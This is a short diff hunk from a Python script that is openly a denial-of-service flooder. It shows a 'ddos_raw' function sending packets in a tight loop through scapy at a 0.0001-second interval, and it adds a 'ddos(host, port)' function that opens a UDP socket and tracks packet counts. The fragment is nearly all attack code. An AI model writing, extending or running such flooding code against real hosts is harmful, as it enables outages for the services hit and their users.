@@ -31,6 +31,7 @@ def ddos_raw(pkg):
             sendp(pkg,loop=1,verbose=0,inter=0.0001)
         except:
             pass
+def ddos(host,port):
     global ready,pkgcount,close
     try:
         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
